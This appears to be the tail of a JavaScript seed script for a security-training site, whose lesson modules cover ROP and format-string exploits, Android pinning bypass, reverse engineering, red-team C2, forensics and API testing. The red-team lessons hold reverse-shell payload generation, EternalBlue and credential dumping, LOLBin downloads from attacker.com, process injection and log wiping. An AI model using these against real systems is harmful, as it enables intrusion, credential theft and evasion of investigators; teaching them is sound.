elf  = ELF('./vuln64')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop  = ROP(elf)

pop_rdi  = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadg = rop.find_gadget(['ret'])[0]  # 16-byte alignment

# Leak libc address first (e.g. via puts@plt)
# Calculate offsets, then:
payload  = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(ret_gadg)    # Stack alignment
payload += p64(system_addr)
\`\`\`

## pwntools ROP Helper

\`\`\`python
rop = ROP(elf)
rop.call('system', [next(libc.search(b'/bin/sh'))])
payload = b'A' * offset + rop.chain()
\`\`\`` },
      { order:2, title:"Format String Attacks", type:"read", xpReward:20, content:`# Format String Vulnerabilities

## The Bug

\`\`\`c
// SAFE:
printf("%s", user_input);

// VULNERABLE:
printf(user_input);  // User controls format string!
\`\`\`

## Leaking Stack

\`\`\`
Input: %p.%p.%p.%p
Output: 0x7ffd1234.0x400670...  ← Stack addresses!

Input: %7$p    ← Read 7th argument directly
\`\`\`

## Read Arbitrary Address

\`\`\`python
from pwn import *
p = process('./vuln')

# Find offset first: AAAA.%1$p.%2$p... until 0x41414141 appears
offset = 6

target = 0x0804a024  # Address to read
payload = p32(target) + b'.%6$s'

p.sendline(payload)
\`\`\`

## Write Arbitrary Values

\`\`\`python
from pwn import *

writes = {target_addr: value_to_write}
payload = fmtstr_payload(offset, writes, write_size='byte')
\`\`\`

\`%n\` writes the number of bytes printed so far to the pointed address.` },
    ],
  },
  {
    path: {"title": "Android App Security Testing", "description": "APK decompilation, HTTPS traffic interception, certificate pinning bypass with Frida, insecure storage analysis, and exported component exploitation.", "category": "mobile", "difficulty": "intermediate", "authorAlias": "xcloak_seed", "status": "approved", "upvotes": 187, "views": 3400},
    modules: [
      { order:0, title:"APK Static Analysis", type:"read", xpReward:15, content:`# APK Static Analysis

## APK Structure

\`\`\`bash
unzip app.apk -d extracted/
# AndroidManifest.xml  — compiled binary XML
# classes.dex          — compiled Java bytecode
# res/                 — resources
# lib/                 — native libraries
\`\`\`

## Decompilation

\`\`\`bash
apktool d app.apk -o app_decompiled    # Resources + manifest
jadx app.apk -d app_java               # DEX → Java
jadx-gui app.apk                       # GUI version
\`\`\`

## Manifest Analysis

Look for:
- \`android:debuggable="true"\` — attach debugger
- \`android:allowBackup="true"\` — backup data via ADB
- Exported Activities without permissions
- \`android:exported="true"\` on sensitive components

## Secret Hunting

\`\`\`bash
grep -r "password" app_java/
grep -r "api_key" app_java/
grep -r "http://" app_java/
cat app_decompiled/res/values/strings.xml
find extracted/assets -type f | xargs strings
\`\`\`

## MobSF (Automated)

\`\`\`bash
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf
# Upload APK at localhost:8000
\`\`\`` },
      { order:1, title:"Certificate Pinning Bypass", type:"read", xpReward:25, content:`# Intercepting Android HTTPS Traffic

## Setup Burp Suite

1. Set Burp listener: 0.0.0.0:8080
2. Android WiFi → Proxy → your PC's IP:8080
3. Visit http://burp → download certificate
4. Settings → Security → Install Certificate

## Android 7+ — User Certs Untrusted

Apps targeting API 24+ don't trust user-installed CAs.

### Fix 1: Network Security Config

\`\`\`xml
<!-- res/xml/network_security_config.xml -->
<network-security-config>
    <debug-overrides>
        <trust-anchors>
            <certificates src="user"/>
        </trust-anchors>
    </debug-overrides>
</network-security-config>
\`\`\`

Repackage: \`apktool b app_decompiled -o patched.apk\`

### Fix 2: Frida Universal Bypass

\`\`\`bash
pip install frida-tools
adb push frida-server /data/local/tmp/
adb shell chmod +x /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &

frida --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida -f com.target.app
\`\`\`

### Fix 3: objection

\`\`\`bash
pip install objection
objection -g com.target.app explore
# In objection:
android sslpinning disable
\`\`\`` },
      { order:2, title:"ADB Dynamic Testing", type:"read", xpReward:20, content:`# ADB Security Testing

## Essentials

\`\`\`bash
adb devices
adb shell
adb pull /data/data/com.target.app/databases/users.db
adb logcat | grep -i "password\\|token\\|api"  # Logs leak secrets!
\`\`\`

## Insecure Storage

\`\`\`bash
adb shell
# Databases
sqlite3 /data/data/com.target.app/databases/data.db
.tables
SELECT * FROM users;

# Shared Preferences
cat /data/data/com.target.app/shared_prefs/*.xml

# External storage
ls /sdcard/Android/data/com.target.app/
\`\`\`

## Exported Components

\`\`\`bash
# Find exported components
grep -A2 'exported="true"' AndroidManifest.xml

# Launch exported activity
adb shell am start -n com.target.app/.AdminActivity

# Query exported content provider
adb shell content query --uri content://com.target.app/users

# Trigger exported broadcast
adb shell am broadcast -a com.target.ADMIN_ACTION
\`\`\`` },
    ],
  },
  {
    path: {"title": "CTF Skills for Beginners", "description": "Everything to start solving CTF challenges: encoding, crypto, steganography, web basics, forensics, and essential Python scripts.", "category": "web", "difficulty": "beginner", "authorAlias": "xcloak_seed", "status": "approved", "upvotes": 421, "views": 8900},
    modules: [
      { order:0, title:"Encoding & Decoding", type:"read", xpReward:10, content:`# Encoding & Decoding

## Base64

\`\`\`bash
echo "eGNsb2Fre2Jhc2U2NH0=" | base64 -d
\`\`\`

\`\`\`python
import base64
base64.b64decode("eGNsb2Fre2Jhc2U2NH0=").decode()
\`\`\`

## Hex

\`\`\`bash
echo "78636c6f616b" | xxd -r -p
\`\`\`

\`\`\`python
bytes.fromhex("78636c6f616b").decode()
\`\`\`

## Binary

\`\`\`python
binary = "01111000 01100011 01101100"
''.join(chr(int(b, 2)) for b in binary.split())
\`\`\`

## ROT13 / Caesar

\`\`\`python
import codecs
codecs.encode('URYYB', 'rot13')  # HELLO

# Try all 26 shifts
for shift in range(26):
    print(shift, ''.join(chr((ord(c)-65+shift)%26+65) if c.isalpha() else c for c in 'CIPHERTEXT'))
\`\`\`

## CyberChef

gchq.github.io/CyberChef — Drag-and-drop encoding/decoding. Essential CTF tool.` },
      { order:1, title:"Steganography Tools", type:"read", xpReward:15, content:`# Steganography

## Image Analysis

\`\`\`bash
file suspicious.png          # Verify file type
strings suspicious.png       # Hidden text
exiftool suspicious.png      # Metadata
binwalk suspicious.png       # Embedded files
binwalk -e suspicious.png    # Extract them

# LSB steganography
zsteg suspicious.png -a      # Try all methods

# steghide
steghide extract -sf suspicious.jpg
steghide extract -sf suspicious.jpg -p "" -f  # Empty password
stegseek suspicious.jpg rockyou.txt            # Crack password
\`\`\`

## Audio Analysis

\`\`\`bash
# Open in Audacity → View → Spectrogram
# Messages often visible as text in spectrogram

# DTMF tones
multimon-ng -t wav -a DTMF audio.wav
\`\`\`

## Document Analysis

\`\`\`bash
# PDF
pdftotext document.pdf

# DOCX (it's a ZIP!)
unzip document.docx -d doc_extracted
cat doc_extracted/word/document.xml
\`\`\`` },
      { order:2, title:"Python for CTF", type:"read", xpReward:20, content:`# Python for CTF

## Essential Imports

\`\`\`python
from pwn import *             # Binary exploitation + networking
from Crypto.Cipher import AES # Cryptography
from Crypto.Util.number import * # RSA math
import base64, binascii, hashlib, requests
\`\`\`

## XOR Brute Force

\`\`\`python
ciphertext = bytes.fromhex("1b0e0e030c")

for key in range(256):
    result = bytes(b ^ key for b in ciphertext)
    try:
        text = result.decode('ascii')
        if all(32 <= c < 127 for c in result):
            print(f"Key {key}: {text}")
    except: pass
\`\`\`

## RSA Solve

\`\`\`python
from Crypto.Util.number import inverse, long_to_bytes

p   = 0xaabbcc...
q   = n // p
phi = (p-1) * (q-1)
d   = inverse(e, phi)
m   = pow(c, d, n)
flag = long_to_bytes(m).decode()
\`\`\`

## Connect to CTF Server

\`\`\`python
from pwn import *
p = remote('challenge.ctf.com', 1337)
print(p.recvline())
p.sendline(b'my_answer')
p.interactive()
\`\`\`` },
    ],
  },
  {
    path: {"title": "Reverse Engineering Binaries", "description": "Ghidra, GDB, anti-debugging bypass, crackme walkthroughs, and defeating common obfuscation techniques.", "category": "binary", "difficulty": "intermediate", "authorAlias": "xcloak_seed", "status": "approved", "upvotes": 234, "views": 4300},
    modules: [
      { order:0, title:"Ghidra \u2014 Getting Started", type:"read", xpReward:15, content:`# Ghidra

## Installation

Download from ghidra-sre.org (requires Java 17+)

\`\`\`bash
apt install default-jdk
./ghidraRun
\`\`\`

## Workflow

1. New Project → Import binary
2. Auto-analysis (accept defaults)
3. Symbol Tree → Functions → main
4. Decompiler window shows pseudo-C

## Key Shortcuts

| Shortcut | Action |
|----------|--------|
| G | Go to address |
| L | Rename label/variable |
| ; | Add comment |
| F | Search functions |
| Space | Toggle listing/decompile |
| Ctrl+F | Search memory/strings |

## Finding main()

\`\`\`
1. Symbol Tree → Functions → main
2. Search strings → "Enter your" → References
3. Entry point → follow __libc_start_main
\`\`\`

## Rename as You Go

Right-click variable → Rename Variable
Right-click → Retype Variable

This makes decompiled output readable.` },
      { order:1, title:"GDB Dynamic Analysis", type:"read", xpReward:20, content:`# GDB — GNU Debugger

## Setup

\`\`\`bash
apt install gdb

# GDB-PEDA (better UI)
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
\`\`\`

## Essential Commands

\`\`\`gdb
gdb ./binary
break main
break *0x08048456
run
run <<< $(python3 -c "print('A'*100)")
next                   # Step over
step                   # Step into
continue               # Next breakpoint
info registers
x/20x $esp             # Hex dump stack
x/s 0x08048700         # String at address
x/i $eip               # Instruction at EIP
\`\`\`

## Finding Overflow Offset

\`\`\`bash
# In GDB-PEDA:
pattern create 200
run   # Paste pattern as input, crash
# Then: pattern offset EIP_VALUE
\`\`\`

## Useful GDB Hooks

\`\`\`gdb
break malloc
commands
  silent
  printf "malloc(%d)\\n", $rdi
  continue
end
\`\`\`` },
      { order:2, title:"Anti-Debugging Bypass", type:"read", xpReward:20, content:`# Anti-Debugging

## Detection Techniques & Bypasses

### ptrace (Linux)

\`\`\`c
// Detection: ptrace returns -1 if already being traced
if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) exit(1);
\`\`\`

Bypass in GDB:
\`\`\`gdb
catch syscall ptrace
commands
  set $rax = 0    # Make ptrace return 0
  continue
end
run
\`\`\`

### Timing Checks

\`\`\`c
time_t start = time(NULL);
// ... operation ...
if (time(NULL) - start > 2) exit(1);  // Too slow = debugger
\`\`\`

Bypass: patch the comparison in memory.

### String Obfuscation

\`\`\`c
// XOR-encoded strings decoded at runtime
unsigned char enc[] = {0x18, 0x0a, 0x0b};
for (int i = 0; i < 3; i++) enc[i] ^= 0x61;
\`\`\`

In Ghidra: look for XOR loops near suspicious code.

### Packing

\`\`\`bash
die binary          # Detect packer
upx -d packed.exe   # Unpack UPX

# For custom packers:
# Let it unpack in memory → dump process with procdump
\`\`\`` },
    ],
  },
  {
    path: {"title": "Red Team Operations & OPSEC", "description": "C2 frameworks, payload generation, AV evasion, living off the land, and maintaining operational security during engagements.", "category": "red", "difficulty": "advanced", "authorAlias": "xcloak_seed", "status": "approved", "upvotes": 289, "views": 5500},
    modules: [
      { order:0, title:"C2 Frameworks \u2014 Sliver & Metasploit", type:"read", xpReward:20, content:`# C2 Frameworks

## Metasploit

\`\`\`bash
msfconsole

search type:exploit name:eternalblue
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# Meterpreter
getuid
hashdump
load kiwi
kiwi_cmd sekurlsa::logonpasswords
\`\`\`

## Sliver (Modern Open-Source C2)

\`\`\`bash
curl https://sliver.sh/install | sudo bash
sliver-server

# Generate implant
generate --http https://attacker.com --save /tmp/implant.exe
generate --mtls attacker.com:443 --os linux --arch amd64

# Listeners
http
mtls

# Post-compromise
use SESSION_ID
ls
execute -o whoami
shell
\`\`\`` },
      { order:1, title:"Payload Generation & AV Evasion", type:"read", xpReward:25, content:`# Payload Generation

## msfvenom

\`\`\`bash
# Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=443 -f exe > shell.exe

# PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=443 -f psh > shell.ps1

# DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=443 -f dll > shell.dll

# Encoded
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=443 -e x64/xor -i 10 -f exe > enc.exe
\`\`\`

## Process Injection (C)

\`\`\`c
HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
LPVOID mem  = VirtualAllocEx(proc, NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(proc, mem, shellcode, len, NULL);
CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
\`\`\`

## Living off the Land

\`\`\`powershell
# Download without PowerShell detection
certutil -urlcache -split -f http://attacker.com/shell.exe shell.exe
bitsadmin /transfer job /download /priority high http://attacker.com/shell.exe C:\\shell.exe
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
\`\`\`` },
      { order:2, title:"OPSEC \u2014 Staying Hidden", type:"read", xpReward:20, content:`# Operational Security

## Infrastructure

- Use redirectors — never expose real C2 IP
- Victim → CDN Redirector → C2 Server
- Buy aged domains that look legitimate
- Use ports 443, 80, 8443 (not 4444)

## Traffic Blending

\`\`\`bash
# Cobalt Strike Malleable C2 Profile
set sleeptime "30000";  # 30 second sleep
set jitter "30";        # 30% jitter
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
\`\`\`

## Anti-Forensics

\`\`\`powershell
# Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Clear Windows event logs
wevtutil cl System
wevtutil cl Security

# Timestomping
touch -t 202001010000 file.exe
\`\`\`

## Detection Avoidance

- Avoid default Mimikatz (signature-heavy) — use direct LSASS reads
- Avoid \`cmd.exe\` → use PowerShell or .NET
- Avoid keywords: "mimikatz", "powershell -enc"
- Use LOLBins: certutil, wmic, regsvr32, mshta
- Don't scan entire subnets at once` },
    ],
  },
  {
    path: {"title": "Secure Code Review & DevSecOps", "description": "Finding vulnerabilities in source code, SAST/DAST tools, CI/CD secrets scanning, and Docker/container security hardening.", "category": "web", "difficulty": "intermediate", "authorAlias": "xcloak_seed", "status": "approved", "upvotes": 176, "views": 3200},
    modules: [
      { order:0, title:"What to Look For in Code", type:"read", xpReward:15, content:`# Secure Code Review

## Dangerous Functions — Instant Red Flags

### Python

\`\`\`python
os.system(user_input)                            # Command injection
subprocess.call(user_input, shell=True)          # Command injection
eval(user_input)                                 # Code execution
cursor.execute(f"SELECT * FROM users WHERE id={user_id}")  # SQLi
pickle.loads(user_data)                          # Deserialization RCE
open(os.path.join(base, user_input))             # Path traversal
\`\`\`

### JavaScript

\`\`\`javascript
child_process.exec(user_input)     // Command injection
document.innerHTML = user_input    // XSS
eval(user_input)                   // Code execution
Object.assign({}, JSON.parse(user_input))  // Prototype pollution
\`\`\`

## GREP Patterns

\`\`\`bash
grep -rn "eval\\|exec\\|system\\|shell_exec" --include="*.py" .
grep -rn "innerHTML\\|document.write\\|eval" --include="*.js" .
grep -rn "dangerouslySetInnerHTML" --include="*.jsx" .

# Hardcoded secrets
grep -rn "password\\s*=\\s*['\\"]" .
grep -rn "api_key\\s*=\\s*['\\"]" .

# SQL concatenation
grep -rn "SELECT.*+.*" .
grep -rn '\\.format.*SELECT' .
\`\`\`` },
      { order:1, title:"SAST Tools \u2014 Semgrep & Bandit", type:"read", xpReward:15, content:`# SAST Tools

## Semgrep (Multi-Language, Free)

\`\`\`bash
pip install semgrep

# Auto rules
semgrep --config auto ./src

# OWASP pack
semgrep --config p/owasp-top-ten .

# Python pack
semgrep --config p/python .

# Custom rule
cat > sqli.yaml << 'YAML'
rules:
  - id: sqli-format
    pattern: cursor.execute(f"...{$VAR}...")
    message: SQL injection via f-string
    severity: ERROR
YAML
semgrep --config sqli.yaml .
\`\`\`

## Bandit (Python Only)

\`\`\`bash
pip install bandit
bandit -r ./src -ll        # Low confidence+
bandit -r ./src -f json    # JSON output
\`\`\`

## DAST — OWASP ZAP

\`\`\`bash
docker run -t owasp/zap2docker-stable zap-baseline.py -t https://target.com
\`\`\`

## Nuclei (Template-Based)

\`\`\`bash
nuclei -u https://target.com
nuclei -u https://target.com -t cves/
nuclei -u https://target.com -t exposures/ -t misconfigurations/
\`\`\`` },
      { order:2, title:"Container & CI/CD Security", type:"read", xpReward:20, content:`# Container Security

## Dockerfile Best Practices

\`\`\`dockerfile
FROM python:3.11-slim        # Minimal base, not :latest
RUN useradd -r -s /bin/false appuser  # Non-root user
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY ./src /app/src
USER appuser
# NEVER: ADD secret.txt . or ENV API_KEY=xxx
\`\`\`

## Scanning Images

\`\`\`bash
trivy image nginx:latest
trivy image --severity HIGH,CRITICAL myapp:latest
trivy fs ./

grype ubuntu:20.04
\`\`\`

## Secure Runtime

\`\`\`bash
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE myapp
docker run --read-only myapp
docker run --security-opt=no-new-privileges myapp
docker run --user 1000:1000 myapp
docker run --memory="512m" --cpus="0.5" myapp
\`\`\`

## CI/CD Secrets

\`\`\`yaml
# GitHub Actions — always use secrets
env:
  API_KEY: \${{ secrets.API_KEY }}  # Good
  # API_KEY: sk-1234abcd           # NEVER

# Scan for secrets in pipeline
- uses: gitleaks/gitleaks-action@v2
\`\`\`` },
    ],
  },
  {
    path: {"title": "Incident Response & Digital Forensics", "description": "Memory forensics with Volatility, log analysis, timeline reconstruction, malware artifacts, and writing professional IR reports.", "category": "red", "difficulty": "intermediate", "authorAlias": "xcloak_seed", "status": "approved", "upvotes": 165, "views": 2900},
    modules: [
      { order:0, title:"Memory Forensics with Volatility", type:"read", xpReward:20, content:`# Memory Forensics

## Setup

\`\`\`bash
pip install volatility3
\`\`\`

## Basic Analysis

\`\`\`bash
# Image info
vol.py -f memory.dmp windows.info

# Process list
vol.py -f memory.dmp windows.pslist
vol.py -f memory.dmp windows.pstree

# Network connections
vol.py -f memory.dmp windows.netstat

# Loaded DLLs per process
vol.py -f memory.dmp windows.dlllist --pid 1234

# Code injection detection
vol.py -f memory.dmp windows.malfind
# MZ headers in unexpected memory = injected code
\`\`\`

## Extract Artifacts

\`\`\`bash
# Dump process
vol.py -f memory.dmp windows.memmap --pid 1234 --dump

# Files
vol.py -f memory.dmp windows.filescan | grep -i ".exe"

# Registry
vol.py -f memory.dmp windows.registry.printkey --key "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

# Linux bash history
vol.py -f linux.dmp linux.bash
\`\`\`

## Suspicious Signs

- Processes with no parent
- cmd.exe / powershell.exe with unusual parents
- Multiple svchost.exe with different parents
- High CPU process named like legitimate tools` },
      { order:1, title:"Log Analysis & DFIR", type:"read", xpReward:20, content:`# Log Analysis

## Windows Key Event IDs

| Event ID | Description | Look For |
|----------|-------------|----------|
| 4624 | Login success | Logon Type 3/10 |
| 4625 | Login failure | Brute force |
| 4688 | Process created | Command line args |
| 4698 | Scheduled task | Persistence |
| 7045 | Service installed | Malware |

\`\`\`powershell
Get-WinEvent -LogName Security | Where-Object { $_.Id -in 4624,4625,4688 }
\`\`\`

## Linux Log Analysis

\`\`\`bash
# Failed logins
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# Successful logins
grep "Accepted" /var/log/auth.log

# Bash history
cat /home/*/.bash_history
cat /root/.bash_history

# Web attacks in access log
grep "' OR\\|UNION SELECT\\|<script" /var/log/nginx/access.log
\`\`\`

## Timeline (Plaso)

\`\`\`bash
log2timeline.py timeline.plaso disk_image.dd
psort.py -z UTC -o l2tcsv timeline.plaso > timeline.csv
\`\`\`` },
      { order:2, title:"Writing IR Reports", type:"read", xpReward:15, content:`# IR Report Structure

## 1. Executive Summary (1 page)
- What happened (plain English)
- Business impact
- Current status
- Immediate actions taken

## 2. Timeline
- Exact timestamps
- What was observed
- Evidence source

## 3. Technical Findings
- Initial access vector
- Persistence mechanisms
- Lateral movement
- Data accessed/exfiltrated

## 4. Indicators of Compromise (IOCs)

\`\`\`
File Hashes:  sha256:a6b5...
IP Addresses: 185.220.101.1
Domains:      update-service.net
Registry:     HKCU\\Run\\SystemUpdate
File Paths:   C:\\Users\\Public\\svchost.exe
\`\`\`

## 5. Recommendations
- Immediate: isolate, reset credentials, patch
- Short-term: EDR, log centralization
- Long-term: security program improvements

## MITRE ATT&CK Mapping

Map every finding to attack.mitre.org:
- T1566.001 — Spearphishing (Initial Access)
- T1059.001 — PowerShell (Execution)
- T1053.005 — Scheduled Task (Persistence)` },
    ],
  },
  {
    path: {"title": "API Security Testing", "description": "BOLA/IDOR, mass assignment, rate limiting bypass, JWT attacks, GraphQL security, and REST API enumeration techniques.", "category": "web", "difficulty": "intermediate", "authorAlias": "xcloak_seed", "status": "approved", "upvotes": 243, "views": 4600},
    modules: [
      { order:0, title:"API Recon \u2014 Finding Hidden Endpoints", type:"read", xpReward:15, content:`# API Reconnaissance

## Finding Documentation

\`\`\`
/api/docs         /swagger.json
/openapi.json     /api/swagger
/graphql          /api/graphql
/redoc
\`\`\`

## JS File Mining

\`\`\`bash
# Find all JS files and extract API paths
gau https://api.example.com | grep "\\.js$" | while read url; do
    curl -s "$url" | grep -oP '/api/[a-zA-Z0-9/_-]+'
done | sort -u

# linkfinder
python3 linkfinder.py -i https://example.com -d -o cli
\`\`\`

## Old API Versions

Old versions often lack newer security controls:
\`\`\`
/api/v1/users  ← Test even if app uses v3!
/api/internal/ ← Internal APIs often less secured
\`\`\`

## GraphQL Introspection

\`\`\`bash
curl -X POST https://api.example.com/graphql \\
  -H "Content-Type: application/json" \\
  -d '{"query":"{__schema{types{name fields{name}}}}"}'
\`\`\`` },
      { order:1, title:"BOLA/IDOR & Mass Assignment", type:"read", xpReward:25, content:`# BOLA & Mass Assignment

## BOLA — Broken Object Level Authorization

#1 API vulnerability. Changing an ID accesses another user's data.

\`\`\`http
GET /api/v1/users/1337/orders
Authorization: Bearer YOUR_TOKEN

# Change ID:
GET /api/v1/users/1338/orders   ← Their orders?
GET /api/v1/users/1/orders      ← Admin's orders?
\`\`\`

## Testing with ffuf

\`\`\`bash
ffuf -w ids.txt -u "https://api.example.com/api/v1/users/FUZZ/profile" \\
  -H "Authorization: Bearer TOKEN" -mc 200
\`\`\`

## Mass Assignment

APIs that blindly accept all JSON fields:

\`\`\`http
PATCH /api/v1/users/profile
{
  "name": "John",
  "is_admin": true,    ← Does this work?
  "role": "admin",     ← Or this?
  "balance": 999999
}
\`\`\`

## Rate Limiting Bypass

\`\`\`http
X-Forwarded-For: 1.2.3.4      ← Different source IP
X-Real-IP: 5.6.7.8

# Slightly modified requests to bypass string matching:
{"email":"admin@example.com "}   ← trailing space
{"email":"ADMIN@example.com"}    ← uppercase
\`\`\`` },
      { order:2, title:"GraphQL Security", type:"read", xpReward:20, content:`# GraphQL Security

## Introspection Attack

\`\`\`bash
curl -X POST https://api.example.com/graphql \\
  -H "Content-Type: application/json" \\
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

# Use graphql-voyager to visualize the schema
\`\`\`

## Common Attacks

### 1. Query Sensitive Fields from Schema

\`\`\`graphql
{
  adminUsers {
    id
    email
    passwordHash    ← Found in schema via introspection
  }
}
\`\`\`

### 2. Batching Attack (Rate Limit Bypass)

\`\`\`json
[
  {"query": "mutation { login(email: \\"admin@ex.com\\", password: \\"pass1\\") { token } }"},
  {"query": "mutation { login(email: \\"admin@ex.com\\", password: \\"pass2\\") { token } }"},
  {"query": "mutation { login(email: \\"admin@ex.com\\", password: \\"pass3\\") { token } }"}
]
\`\`\`

Multiple operations in one HTTP request bypass per-request rate limits.

### 3. DoS via Nested Queries

\`\`\`graphql
{
  user(id: 1) {
    posts { author { posts { author { posts { title } } } } }
  }
}
\`\`\`

O(n^x) database lookups.

## Tools

- **InQL**: Burp extension for GraphQL
- **GraphQLmap**: Injection and enumeration
- **Altair**: GraphQL client` },
    ],
  },
]

async function main() {
  console.log('=== XCloak Database Seed ===\n')

  // Seed exploits
  console.log('Seeding exploits...')
  let exploitOk = 0
  for (const ex of EXPLOITS) {
    try {
      await prisma.exploit.upsert({
        where:  { slug: ex.slug },
        create: ex,
        update: { views: ex.views, upvotes: ex.upvotes, score: ex.score, status: ex.status },
      })
      console.log(`  ✓ ${ex.title.slice(0, 60)}`)
      exploitOk++
    } catch (e) {
      console.log(`  ✗ ${ex.slug}: ${e.message?.slice(0, 80)}`)
    }
  }

  // Seed CTF challenges
  console.log('\nSeeding CTF challenges...')
  let ctfOk = 0
  for (const ch of CTF_CHALLENGES) {
    try {
      const flagHash = createHash('sha256').update(ch.flag).digest('hex')
      const existing = await prisma.cTFChallenge.findFirst({ where: { title: ch.title } })
      if (existing) {
        await prisma.cTFChallenge.update({ where: { id: existing.id }, data: { status: ch.status } })
        console.log(`  ~ ${ch.title} (updated)`)
      } else {
        await prisma.cTFChallenge.create({
          data: {
            title:       ch.title,
            category:    ch.category,
            difficulty:  ch.difficulty,
            description: ch.description,
            flagHash,
            points:      ch.points,
            hints:       ch.hints,
            authorAlias: ch.authorAlias,
            status:      ch.status,
          },
        })
        console.log(`  ✓ ${ch.title}`)
      }
      ctfOk++
    } catch (e) {
      console.log(`  ✗ ${ch.title}: ${e.message?.slice(0, 80)}`)
    }
  }

  // Seed learning paths
  console.log('\nSeeding learning paths...')
  let pathOk = 0
  for (const { path, modules } of LEARNING_PATHS) {
    try {
      const existing = await prisma.learningPath.findFirst({ where: { title: path.title } })
      if (existing) {
        await prisma.learningPath.update({ where: { id: existing.id }, data: { status: path.status, upvotes: path.upvotes, views: path.views } })
        console.log(`  ~ ${path.title} (updated)`)
      } else {
        await prisma.learningPath.create({ data: { ...path, modules: { create: modules } } })
        console.log(`  ✓ ${path.title} (${modules.length} modules)`)
      }
      pathOk++
    } catch (e) {
      console.log(`  ✗ ${path.title}: ${e.message?.slice(0,80)}`)
    }
  }

  console.log(`\n✅ Done: ${exploitOk}/${EXPLOITS.length} exploits, ${ctfOk}/${CTF_CHALLENGES.length} CTF, ${pathOk}/${LEARNING_PATHS.length} learning paths`)
  await prisma.$disconnect()
}

main().catch(e => { console.error(e); prisma.$disconnect(); process.exit(1) })
